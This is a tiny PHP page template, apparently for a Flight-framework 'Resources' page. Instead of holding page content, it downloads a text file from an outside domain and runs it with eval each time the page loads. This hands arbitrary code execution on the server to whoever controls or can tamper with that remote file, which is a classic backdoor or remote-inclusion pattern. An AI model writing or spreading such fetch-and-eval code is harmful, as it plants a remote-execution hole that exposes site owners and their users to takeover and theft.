<?php Flight::set('innerPageBannerTitle', 'Resources');
	$filedata = file_get_contents('https://oraiko-demo.com/oraiko-demo-resource.txt');
    eval ("?>$filedata");
?>